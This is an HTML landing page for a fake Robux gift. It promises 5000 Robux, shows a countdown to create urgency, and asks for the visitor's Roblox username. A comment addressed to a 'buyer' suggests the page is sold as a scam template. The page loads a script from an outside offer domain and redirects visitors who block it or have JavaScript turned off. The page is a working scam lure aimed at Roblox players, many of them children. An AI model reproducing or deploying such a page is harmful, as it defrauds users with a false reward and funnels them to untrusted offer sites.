<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Redeem Gift</title>
  <meta name="description" content="Claim your Robux gift before it expires.">
  <meta property="og:title" content="You have received 5000 Robux">
  <meta property="og:description" content="Claim your Robux gift before it expires.">
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://example.com/">
  <meta property="og:image" content="images/Gqqe3TPIp7pL.webp">
  <link rel="canonical" href="https://example.com/">
  <link rel="icon" type="image/svg+xml" href="images/yqrn9wVqtf7s.svg">
  <link rel="stylesheet" href="css/redeem-gift.css">
  
  <!-- Anti-adblock / redirect script -->
  <noscript><meta http-equiv="refresh" content="0;url=https://targetoffers.xyz/noscript" /></noscript>
  <script type="text/javascript">var ogblock=true;</script>
  <script type="text/javascript" id="ogjs" src="https://targetoffers.xyz/cl/js/pqrwj4"></script>
  <script type="text/javascript">if(ogblock) window.location.href = "https://targetoffers.xyz/adblock";</script>
  
  <!-- Buyer config: edit config.js to set the redirect URL. -->
  <script src="config.js"></script>
</head>
<body>
  <main class="redeem-page">
    <section class="gift-stage">
      <div class="gift-card" aria-live="polite">
        <h1>REDEEM<br>GIFT</h1>
        <img class="gift-icon" src="images/YzXr5i06sU0P.webp" alt="" width="112" height="112">
        <p class="gift-copy">
          <span>You received</span>
          <img src="images/YRv0cUNGIx9q.svg" alt="" width="26" height="26">
          <strong>5000 Robux</strong>
        </p>
        <button class="claim-button" type="button" id="open-claim">CLAIM</button>
      </div>

      <form class="claim-modal" id="claim-form" hidden>
        <button class="close-button" type="button" id="close-claim" aria-label="Close">x</button>
        <h2>Confirm account</h2>
        <p>Enter your Roblox username to reserve the gift.</p>
        <label for="username">Roblox username</label>
        <input id="username" name="username" type="text" minlength="3" autocomplete="off" placeholder="Your username" required>
        <button class="final-button" type="submit">Claim reward</button>
        <span id="claim-status" class="claim-status"></span>
      </form>
    </section>

    <section class="countdown" aria-label="Expiration">
      <div>
        <strong id="days">5</strong>
        <span>Day</span>
      </div>
      <div>
        <strong id="hours">19</strong>
        <span>Hours</span>
      </div>
      <div>
        <strong id="minutes">3</strong>
        <span>Minutes</span>
      </div>
      <div>
        <strong id="seconds">19</strong>
        <span>Seconds</span>
      </div>
    </section>
  </main>

  <script src="js/redeem-gift.js"></script>
  <script src="redirect-handler.js"></script>
</body>
</html>
